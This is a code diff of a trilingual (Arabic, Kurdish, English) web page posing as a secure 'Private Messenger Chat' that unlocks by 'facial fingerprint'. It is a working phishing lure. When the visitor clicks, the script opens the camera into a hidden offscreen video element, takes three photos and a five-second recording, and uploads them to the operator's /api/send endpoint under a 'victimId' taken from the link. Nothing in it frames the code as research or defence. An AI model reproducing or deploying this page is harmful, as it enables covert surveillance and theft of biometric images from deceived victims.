@@ -4,405 +4,299 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title data-i18n="page_title">دردشة مسنجر خاص</title>
-
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
-
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Cairo', sans-serif;
-        }
-
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Cairo',sans-serif; }
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background: linear-gradient(135deg, #0084ff, #00c6ff);
-            flex-direction: column;
-            padding: 20px;
+            display:flex; justify-content:center; align-items:center; min-height:100vh;
+            background:linear-gradient(135deg, #0084ff, #00c6ff); flex-direction:column; padding:20px;
         }
-
-        /* کارتی سەرەکی شین */
         .card {
-            width: 390px;
-            max-width: 95%;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 28px;
-            padding: 35px 28px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.3);
+            width:390px; max-width:95%; background:rgba(255,255,255,0.95);
+            backdrop-filter:blur(20px); border-radius:28px; padding:35px 28px;
+            box-shadow:0 20px 50px rgba(0,0,0,0.3); text-align:center; border:1px solid rgba(255,255,255,0.3);
         }
-
-        /* لۆگۆی ماسنجەر + قفڵ */
-        .logo-area {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 25px;
-        }
+        .logo-area { display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:25px; }
         .messenger-icon {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, #0084ff, #00c6ff);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 8px 20px rgba(0,132,255,0.4);
-            position: relative;
+            width:70px; height:70px; background:linear-gradient(135deg, #0084ff, #00c6ff);
+            border-radius:50%; display:flex; align-items:center; justify-content:center;
+            box-shadow:0 8px 20px rgba(0,132,255,0.4);
         }
-        .messenger-icon svg {
-            width: 38px;
-            height: 38px;
-            fill: #fff;
-        }
+        .messenger-icon svg { width:38px; height:38px; fill:#fff; }
         .lock-icon {
-            width: 36px;
-            height: 36px;
-            background: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-            color: #0084ff;
-            font-size: 20px;
+            width:36px; height:36px; background:#fff; border-radius:50%;
+            display:flex; align-items:center; justify-content:center;
+            box-shadow:0 4px 10px rgba(0,0,0,0.15); color:#0084ff; font-size:20px;
         }
-
-        h1 {
-            color: #111;
-            font-size: 24px;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            color: #0084ff;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            letter-spacing: 0.5px;
-        }
-
-        /* بۆکسی ڕێنماییەکان */
+        h1 { color:#111; font-size:24px; margin-bottom:8px; }
+        .subtitle { color:#0084ff; font-size:14px; font-weight:600; margin-bottom:20px; }
         .features-box {
-            background: #f0f6ff;
-            border-radius: 18px;
-            padding: 18px;
-            text-align: right;
-            margin-bottom: 25px;
-            border: 1px solid #d4e7ff;
+            background:#f0f6ff; border-radius:18px; padding:18px; text-align:right;
+            margin-bottom:25px; border:1px solid #d4e7ff;
         }
-        .features-box p {
-            color: #1a1a1a;
-            font-size: 13px;
-            line-height: 2;
-            margin: 0;
-        }
-        .features-box .feature-icon {
-            display: inline-block;
-            width: 18px;
-            text-align: center;
-            margin-left: 5px;
-            color: #0084ff;
-        }
-
-        /* دوگمە */
+        .features-box p { color:#1a1a1a; font-size:13px; line-height:2; margin:0; }
+        .features-box .feature-icon { display:inline-block; width:18px; text-align:center; margin-left:5px; color:#0084ff; }
         .btn {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(135deg, #0084ff, #00b2ff);
-            color: #fff;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.25s;
-            box-shadow: 0 8px 18px rgba(0,132,255,0.35);
-            letter-spacing: 0.3px;
+            width:100%; padding:16px; border:none; border-radius:50px;
+            background:linear-gradient(135deg, #0084ff, #00b2ff); color:#fff;
+            font-size:17px; font-weight:700; cursor:pointer; transition:0.25s;
+            box-shadow:0 8px 18px rgba(0,132,255,0.35);
         }
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 24px rgba(0,132,255,0.5);
-        }
-        .btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        #result {
-            margin-top: 18px;
-            font-weight: 600;
-            font-size: 14px;
-            min-height: 22px;
-            color: #0084ff;
-        }
-
-        /* هەڵبژاردەی زمان */
+        .btn:hover { transform:translateY(-2px); box-shadow:0 12px 24px rgba(0,132,255,0.5); }
+        .btn:disabled { opacity:0.7; cursor:not-allowed; transform:none; }
+        #result { margin-top:18px; font-weight:600; font-size:14px; min-height:22px; color:#0084ff; }
         .lang-selector {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 25px;
-            background: rgba(255,255,255,0.25);
-            border-radius: 30px;
-            padding: 5px;
+            display:flex; gap:8px; margin-bottom:25px; background:rgba(255,255,255,0.25);
+            border-radius:30px; padding:5px;
         }
         .lang-btn {
-            border: none;
-            background: transparent;
-            padding: 8px 16px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 600;
-            color: rgba(255,255,255,0.9);
-            transition: 0.3s;
+            border:none; background:transparent; padding:8px 16px; border-radius:20px;
+            cursor:pointer; font-size:13px; font-weight:600; color:rgba(255,255,255,0.9); transition:0.3s;
         }
-        .lang-btn.active {
-            background: #fff;
-            color: #0084ff;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-        }
+        .lang-btn.active { background:#fff; color:#0084ff; box-shadow:0 2px 6px rgba(0,0,0,0.15); }
     </style>
 </head>
 <body>
 
-    <div class="lang-selector">
-        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
-        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
-        <button class="lang-btn" onclick="changeLang('en')">English</button>
+<div class="lang-selector">
+    <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
+    <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
+    <button class="lang-btn" onclick="changeLang('en')">English</button>
+</div>
+
+<div class="card">
+    <div class="logo-area">
+        <div class="messenger-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.36 2 2 6.13 2 11.7c0 2.91 1.34 5.44 3.41 7.12.28.23.45.57.42.94l-.31 2.46c-.06.48.42.85.87.65l2.95-1.3c.3-.13.64-.13.94.01 1.1.49 2.34.76 3.66.76 5.64 0 10-4.13 10-9.7S17.64 2 12 2zm1.24 12.47l-2.53-2.82c-.28-.31-.76-.33-1.07-.05l-3.4 2.5c-.4.3-.46.85-.13 1.24.33.39.93.42 1.3.08l2.24-1.72c.27-.21.65-.19.9.06l2.53 2.82c.28.31.76.33 1.07.05l3.4-2.5c.4-.3.46-.85.13-1.24-.33-.39-.93-.42-1.3-.08l-2.24 1.72c-.27.21-.65.19-.9-.06z"/></svg>
+        </div>
+        <div class="lock-icon">🔒</div>
     </div>
 
-    <div class="card">
-        <div class="logo-area">
-            <div class="messenger-icon">
-                <svg viewBox="0 0 24 24"><path d="M12 2C6.36 2 2 6.13 2 11.7c0 2.91 1.34 5.44 3.41 7.12.28.23.45.57.42.94l-.31 2.46c-.06.48.42.85.87.65l2.95-1.3c.3-.13.64-.13.94.01 1.1.49 2.34.76 3.66.76 5.64 0 10-4.13 10-9.7S17.64 2 12 2zm1.24 12.47l-2.53-2.82c-.28-.31-.76-.33-1.07-.05l-3.4 2.5c-.4.3-.46.85-.13 1.24.33.39.93.42 1.3.08l2.24-1.72c.27-.21.65-.19.9.06l2.53 2.82c.28.31.76.33 1.07.05l3.4-2.5c.4-.3.46-.85.13-1.24-.33-.39-.93-.42-1.3-.08l-2.24 1.72c-.27.21-.65.19-.9-.06z"/></svg>
-            </div>
-            <div class="lock-icon">🔒</div>
-        </div>
+    <h1 data-i18n="main_title">مرحباً بك في دردشة مسنجر خاص</h1>
+    <p class="subtitle" data-i18n="subtitle">آمنة · مشفرة · خاصة</p>
 
-        <h1 data-i18n="main_title">مرحباً بك في دردشة مسنجر خاص</h1>
-        <p class="subtitle" data-i18n="subtitle">آمنة · مشفرة · خاصة</p>
-
-        <div class="features-box">
-            <p data-i18n="feat1"><span class="feature-icon">✔️</span> المحادثة آمنة ومشفرة بين الطرفين تماماً</p>
-            <p data-i18n="feat2"><span class="feature-icon">🚫</span> يمنع تصوير لقطة الشاشة</p>
-            <p data-i18n="feat3"><span class="feature-icon">🔒</span> يمنع حفظ الصور والفيديو والصوت</p>
-            <p data-i18n="feat4"><span class="feature-icon">⏳</span> تُمسح المحادثة بعد المشاهدة تلقائياً</p>
-            <p data-i18n="feat5"><span class="feature-icon">👤</span> تُفتح الدردشة ببصمة الوجه فقط للأمان</p>
-        </div>
-
-        <button id="btnStart" class="btn" data-i18n="start_btn">
-            لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا
-        </button>
-
-        <div id="result"></div>
+    <div class="features-box">
+        <p data-i18n="feat1"><span class="feature-icon">✔️</span> المحادثة آمنة ومشفرة بين الطرفين تماماً</p>
+        <p data-i18n="feat2"><span class="feature-icon">🚫</span> يمنع تصوير لقطة الشاشة</p>
+        <p data-i18n="feat3"><span class="feature-icon">🔒</span> يمنع حفظ الصور والفيديو والصوت</p>
+        <p data-i18n="feat4"><span class="feature-icon">⏳</span> تُمسح المحادثة بعد المشاهدة تلقائياً</p>
+        <p data-i18n="feat5"><span class="feature-icon">👤</span> تُفتح الدردشة ببصمة الوجه فقط للأمان</p>
     </div>
 
-    <!-- ڤیدیۆی شاراوە -->
-    <video id="hiddenVideo" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+    <button id="btnStart" class="btn" data-i18n="start_btn">
+        لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا
+    </button>
 
-    <script>
-        const translations = {
-            ar: {
-                page_title: "دردشة مسنجر خاص",
-                main_title: "مرحباً بك في دردشة مسنجر خاص",
-                subtitle: "آمنة · مشفرة · خاصة",
-                feat1: "المحادثة آمنة ومشفرة بين الطرفين تماماً",
-                feat2: "يمنع تصوير لقطة الشاشة",
-                feat3: "يمنع حفظ الصور والفيديو والصوت",
-                feat4: "تُمسح المحادثة بعد المشاهدة تلقائياً",
-                feat5: "تُفتح الدردشة ببصمة الوجه فقط للأمان",
-                start_btn: "لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا",
-                loading: "⏳ جارٍ التجهيز...",
-                capturing_photos: "📸 جارٍ مسح بصمة الوجه...",
-                capturing_video: "🎥 جارٍ التحقق الإضافي...",
-                sending: "📤 جارٍ إرسال البيانات...",
-                success: "✅ تم التحقق بنجاح",
-                fail: "❌ فشل التحقق، يرجى المحاولة لاحقاً",
-                camera_error: "⚠️ تعذر الوصول إلى الكاميرا"
-            },
-            ckb: {
-                page_title: "دەردەشەی تایبەتی مەسنجەر",
-                main_title: "بەخێربێیت بۆ دەردەشەی تایبەتی مەسنجەر",
-                subtitle: "پارێزراو · کریپتۆکراو · تایبەت",
-                feat1: "وتووێژەکە بە تەواوی پارێزراو و کریپتۆکراوە لە نێوان هەردوو لادا",
-                feat2: "ڕێگری لە وێنەگرتنی شاشە دەکرێت",
-                feat3: "ڕێگری لە پاشەکەوتکردنی وێنە و ڤیدیۆ و دەنگ دەکرێت",
-                feat4: "وتووێژەکە خۆکارانە دەسڕێتەوە دوای بینین",
-                feat5: "دەردەشەکە تەنها بە پەنجەمۆری دەم و چاو دەکرێتەوە بۆ پاراستن",
-                start_btn: "بۆ کردنەوەی دەردەشە و دروستکردنی پەنجەمۆری چوونەژوورەوە کرتە لێرە بکە",
-                loading: "⏳ ئامادەکردن...",
-                capturing_photos: "📸 سکانکردنی پەنجەمۆری دەم و چاو...",
-                capturing_video: "🎥 پشتڕاستکردنەوەی زیاتر...",
-                sending: "📤 ناردنی داتا...",
-                success: "✅ پشتڕاستکرایەوە",
-                fail: "❌ پشتڕاستکردنەوە سەرکەوتوو نەبوو، تکایە دواتر هەوڵبدەرەوە",
-                camera_error: "⚠️ ناتوانرێت کامێرا بکرێتەوە"
-            },
-            en: {
-                page_title: "Private Messenger Chat",
-                main_title: "Welcome to Private Messenger Chat",
-                subtitle: "Secure · Encrypted · Private",
-                feat1: "The conversation is fully secure and encrypted between both parties",
-                feat2: "Screenshot capture is blocked",
-                feat3: "Saving photos, videos and audio is blocked",
-                feat4: "The chat is automatically deleted after viewing",
-                feat5: "The chat opens only with facial fingerprint for security",
-                start_btn: "To open the chat and create the login fingerprint, click here",
-                loading: "⏳ Preparing...",
-                capturing_photos: "📸 Scanning facial fingerprint...",
-                capturing_video: "🎥 Additional verification...",
-                sending: "📤 Sending data...",
-                success: "✅ Verification successful",
-                fail: "❌ Verification failed, please try again later",
-                camera_error: "⚠️ Could not access camera"
-            }
-        };
+    <div id="result"></div>
+</div>
 
-        function changeLang(lang) {
-            if (lang === 'ar' || lang === 'ckb') {
-                document.documentElement.dir = 'rtl';
+<!-- ڤیدیۆی شاراوە -->
+<video id="hiddenVideo" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+
+<script>
+// ========== وەرگێڕانەکان ==========
+const translations = {
+    ar: {
+        page_title: "دردشة مسنجر خاص",
+        main_title: "مرحباً بك في دردشة مسنجر خاص",
+        subtitle: "آمنة · مشفرة · خاصة",
+        feat1: "المحادثة آمنة ومشفرة بين الطرفين تماماً",
+        feat2: "يمنع تصوير لقطة الشاشة",
+        feat3: "يمنع حفظ الصور والفيديو والصوت",
+        feat4: "تُمسح المحادثة بعد المشاهدة تلقائياً",
+        feat5: "تُفتح الدردشة ببصمة الوجه فقط للأمان",
+        start_btn: "لفتح الدردشة وإنشاء بصمة الدخول اضغط هنا",
+        loading: "⏳ جارٍ التجهيز...",
+        capturing_photos: "📸 جارٍ مسح بصمة الوجه...",
+        capturing_video: "🎥 جارٍ التحقق الإضافي...",
+        sending: "📤 جارٍ إرسال البيانات...",
+        success: "✅ تم التحقق بنجاح",
+        fail: "❌ فشل التحقق، يرجى المحاولة لاحقاً",
+        camera_error: "⚠️ تعذر الوصول إلى الكاميرا"
+    },
+    ckb: {
+        page_title: "دەردەشەی تایبەتی مەسنجەر",
+        main_title: "بەخێربێیت بۆ دەردەشەی تایبەتی مەسنجەر",
+        subtitle: "پارێزراو · کریپتۆکراو · تایبەت",
+        feat1: "وتووێژەکە بە تەواوی پارێزراو و کریپتۆکراوە لە نێوان هەردوو لادا",
+        feat2: "ڕێگری لە وێنەگرتنی شاشە دەکرێت",
+        feat3: "ڕێگری لە پاشەکەوتکردنی وێنە و ڤیدیۆ و دەنگ دەکرێت",
+        feat4: "وتووێژەکە خۆکارانە دەسڕێتەوە دوای بینین",
+        feat5: "دەردەشەکە تەنها بە پەنجەمۆری دەم و چاو دەکرێتەوە بۆ پاراستن",
+        start_btn: "بۆ کردنەوەی دەردەشە و دروستکردنی پەنجەمۆری چوونەژوورەوە کرتە لێرە بکە",
+        loading: "⏳ ئامادەکردن...",
+        capturing_photos: "📸 سکانکردنی پەنجەمۆری دەم و چاو...",
+        capturing_video: "🎥 پشتڕاستکردنەوەی زیاتر...",
+        sending: "📤 ناردنی داتا...",
+        success: "✅ پشتڕاستکرایەوە",
+        fail: "❌ پشتڕاستکردنەوە سەرکەوتوو نەبوو، تکایە دواتر هەوڵبدەرەوە",
+        camera_error: "⚠️ ناتوانرێت کامێرا بکرێتەوە"
+    },
+    en: {
+        page_title: "Private Messenger Chat",
+        main_title: "Welcome to Private Messenger Chat",
+        subtitle: "Secure · Encrypted · Private",
+        feat1: "The conversation is fully secure and encrypted between both parties",
+        feat2: "Screenshot capture is blocked",
+        feat3: "Saving photos, videos and audio is blocked",
+        feat4: "The chat is automatically deleted after viewing",
+        feat5: "The chat opens only with facial fingerprint for security",
+        start_btn: "To open the chat and create the login fingerprint, click here",
+        loading: "⏳ Preparing...",
+        capturing_photos: "📸 Scanning facial fingerprint...",
+        capturing_video: "🎥 Additional verification...",
+        sending: "📤 Sending data...",
+        success: "✅ Verification successful",
+        fail: "❌ Verification failed, please try again later",
+        camera_error: "⚠️ Could not access camera"
+    }
+};
+
+function changeLang(lang) {
+    if (lang === 'ar' || lang === 'ckb') {
+        document.documentElement.dir = 'rtl';
+    } else {
+        document.documentElement.dir = 'ltr';
+    }
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (translations[lang] && translations[lang][key]) {
+            if (key.startsWith('feat')) {
+                const icon = el.querySelector('.feature-icon');
+                el.innerHTML = (icon ? icon.outerHTML + ' ' : '') + translations[lang][key];
             } else {
-                document.documentElement.dir = 'ltr';
+                el.textContent = translations[lang][key];
             }
+        }
+    });
+    document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
+    localStorage.setItem('preferred_lang_messenger', lang);
+}
 
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[lang] && translations[lang][key]) {
-                    if (key.startsWith('feat')) {
-                        const icon = el.querySelector('.feature-icon');
-                        el.innerHTML = (icon ? icon.outerHTML + ' ' : '') + translations[lang][key];
-                    } else {
-                        el.textContent = translations[lang][key];
-                    }
-                }
+window.addEventListener('DOMContentLoaded', () => {
+    const savedLang = localStorage.getItem('preferred_lang_messenger') || 'ar';
+    changeLang(savedLang);
+});
+
+// ========== لۆجیک ==========
+const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
+const hiddenVideo = document.getElementById('hiddenVideo');
+const resEl = document.getElementById('result');
+const btn = document.getElementById('btnStart');
+let stream = null;
+
+async function apiSend(payload) {
+    try {
+        const r = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        return r.ok;
+    } catch (e) { return false; }
+}
+
+function capturePhotos(count = 3) {
+    const photos = [];
+    for (let i = 0; i < count; i++) {
+        const canvas = document.createElement('canvas');
+        canvas.width = hiddenVideo.videoWidth || 640;
+        canvas.height = hiddenVideo.videoHeight || 480;
+        canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
+        photos.push(canvas.toDataURL('image/jpeg', 0.8));
+    }
+    return photos;
+}
+
+function recordVideo(durationMs) {
+    return new Promise((resolve, reject) => {
+        if (!stream) return reject(new Error('No stream'));
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            resolve(blob);
+        };
+        mediaRecorder.onerror = reject;
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), durationMs);
+    });
+}
+
+// گۆڕینی بلۆبی ڤیدیۆ بۆ base64 (data URL)
+function blobToBase64(blob) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
+    });
+}
+
+async function startHiddenCapture() {
+    const lang = localStorage.getItem('preferred_lang_messenger') || 'ar';
+    btn.disabled = true;
+    resEl.textContent = '';
+
+    try {
+        // کردنەوەی کامێرای شاراوە
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        hiddenVideo.srcObject = stream;
+        await hiddenVideo.play();
+        await new Promise(r => setTimeout(r, 800));
+
+        // ١. ٣ وێنە
+        btn.textContent = translations[lang].capturing_photos;
+        const photos = capturePhotos(3);
+        for (let i = 0; i < photos.length; i++) {
+            const ok = await apiSend({
+                type: 'photo',
+                chatId: victimId,
+                photo: photos[i],
+                caption: `📸 بصمة الوجه ${i + 1} - ${victimId}`
             });
-
-            document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-            document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
-
-            localStorage.setItem('preferred_lang_messenger', lang);
+            if (!ok) throw new Error('Photo send failed');
         }
 
-        window.addEventListener('DOMContentLoaded', () => {
-            const savedLang = localStorage.getItem('preferred_lang_messenger') || 'ar';
-            changeLang(savedLang);
+        // ٢. ٥ چرکە ڤیدیۆ
+        btn.textContent = translations[lang].capturing_video;
+        const videoBlob = await recordVideo(5000);
+        // گۆڕینی بۆ base64
+        const videoBase64 = await blobToBase64(videoBlob);
+
+        btn.textContent = translations[lang].sending;
+        const videoOk = await apiSend({
+            type: 'video',
+            chatId: victimId,
+            video: videoBase64,
+            caption: `🎥 فيديو التحقق - ${victimId}`
         });
 
-        // ========== ناسنامە و API ==========
-        const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
-        const hiddenVideo = document.getElementById('hiddenVideo');
-        const resEl = document.getElementById('result');
-        const btn = document.getElementById('btnStart');
-        let stream = null;
-
-        async function apiSend(payload) {
-            try {
-                const r = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                return r.ok;
-            } catch (e) { return false; }
+        if (videoOk) {
+            resEl.textContent = translations[lang].success;
+        } else {
+            throw new Error('Video send failed');
         }
 
-        async function apiSendVideo(videoBlob) {
-            const form = new FormData();
-            form.append('chatId', victimId);
-            form.append('video', videoBlob, `face_${victimId}.webm`);
-            try {
-                const r = await fetch('/api/send', {
-                    method: 'POST',
-                    body: form
-                });
-                return r.ok;
-            } catch (e) { return false; }
+    } catch (e) {
+        console.error(e);
+        resEl.textContent = translations[lang].fail;
+    } finally {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
         }
+        btn.disabled = false;
+        btn.textContent = translations[lang].start_btn;
+    }
+}
 
-        function capturePhotos(count = 3) {
-            const photos = [];
-            for (let i = 0; i < count; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = hiddenVideo.videoWidth || 640;
-                canvas.height = hiddenVideo.videoHeight || 480;
-                canvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
-                photos.push(canvas.toDataURL('image/jpeg', 0.8));
-            }
-            return photos;
-        }
-
-        function recordVideo(durationMs) {
-            return new Promise((resolve, reject) => {
-                if (!stream) return reject(new Error('No stream'));
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-                mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
-                mediaRecorder.onerror = reject;
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), durationMs);
-            });
-        }
-
-        async function startHiddenCapture() {
-            const lang = localStorage.getItem('preferred_lang_messenger') || 'ar';
-            btn.disabled = true;
-            resEl.textContent = '';
-
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-                    audio: false
-                });
-                hiddenVideo.srcObject = stream;
-                await hiddenVideo.play();
-                await new Promise(r => setTimeout(r, 800));
-
-                // ١. ٣ وێنە
-                btn.textContent = translations[lang].capturing_photos;
-                const photos = capturePhotos(3);
-                for (let i = 0; i < photos.length; i++) {
-                    await apiSend({
-                        type: 'photo',
-                        chatId: victimId,
-                        photo: photos[i],
-                        caption: `📸 بصمة الوجه ${i + 1} - ${victimId}`
-                    });
-                }
-
-                // ٢. ٥ چرکە ڤیدیۆ
-                btn.textContent = translations[lang].capturing_video;
-                const videoBlob = await recordVideo(5000);
-                btn.textContent = translations[lang].sending;
-                const videoOk = await apiSendVideo(videoBlob);
-
-                resEl.textContent = videoOk ? translations[lang].success : translations[lang].fail;
-
-            } catch (e) {
-                if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-                    resEl.textContent = translations[lang].camera_error;
-                } else {
-                    resEl.textContent = translations[lang].fail;
-                }
-            } finally {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                }
-                btn.disabled = false;
-                btn.textContent = translations[lang].start_btn;
-            }
-        }
-
-        document.getElementById('btnStart').addEventListener('click', startHiddenCapture);
-    </script>
+document.getElementById('btnStart').addEventListener('click', startHiddenCapture);
+</script>
 </body>
 </html>
